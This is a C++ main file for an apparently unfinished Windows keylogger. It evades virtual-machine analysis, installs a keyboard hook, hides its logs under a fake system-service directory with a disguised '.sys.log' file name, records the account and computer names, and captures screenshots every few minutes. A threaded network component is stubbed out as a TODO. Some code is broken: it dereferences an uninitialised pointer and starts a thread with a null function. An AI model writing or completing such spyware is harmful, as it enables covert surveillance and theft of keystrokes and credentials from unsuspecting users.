#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "network.h"
#include "debug.h"

#ifdef DEBUG_BUILD
#include "encrypt.h"
#endif

#define MINUTE 6000

typedef struct CHStruct {
	std::string file;
} *pCHStruct;

int main() {
#ifdef DEBUG_BUILD
	Sys::CreateShell("/k ipconfig -a");
#endif

#ifndef DEBUG_BUILD
	if (Sys::CheckForVirtualMachine()) {
		KeyHook::UninstallHook();
		Sys::RemoveFromRegistry();
		KeyHook::KillProcess();
		return 0;
	}

//  Sys::AddToRegistry();
	KeyHook::InstallHook();
	clientInfo = Stream::GetAccountInfo(clientInfo);

	std::string path = Stream::GetPath("\\Microsoft\\");
	std::string dirName = "SystemService";

	Stream::MakeDir(path, dirName, FILE_ATTRIBUTE_HIDDEN);
	Stream::MakeFile("wnxshl2.sys.log", path + "\\" + dirName);
	Stream::LogFile logFile(path + dirName, "wnxshl2.sys.log");

	Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, logFile, false);

	std::ostringstream ostream;
	ostream << "\n[*] OS Info: Major - " << clientInfo.osVersionInfo.dwMajorVersion << "; Minor - "
	        << clientInfo.osVersionInfo.dwMinorVersion << " [*]"
	        << "\n[*] Account Info: User -" << clientInfo.accountName << "; Computer - " << clientInfo.computerName
	        << " [*]";

	std::string write = ostream.str();
	Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
	Screen::CaptureScreen(path + "\\", "winpst", true,  MINUTE*10); // Screenshot

	pCHStruct pClientThreadHandleParams;
	pClientThreadHandleParams->file = path; // TODO: Idk if this is the path we need
	HANDLE keyHookHandle = CreateThread(nullptr, 0, KeyHook::HandleMessage, (LPVOID)1, 0, nullptr);
	HANDLE clientThreadHandle = CreateThread(nullptr,
	                                         0,
	                                         nullptr,
	                                         pClientThreadHandleParams,
	                                         0,
	                                         nullptr);// TODO: replace lpStartAddress with network funct
	const size_t HANDLE_ARR_SIZE = 2;
	HANDLE handleArr[HANDLE_ARR_SIZE] = {keyHookHandle, clientThreadHandle};

	WaitForMultipleObjects(HANDLE_ARR_SIZE, handleArr, TRUE, INFINITE);
	for (auto &i : handleArr) {
		CloseHandle(i);
	}

#endif // DEBUG_BUILD
	return 0;
}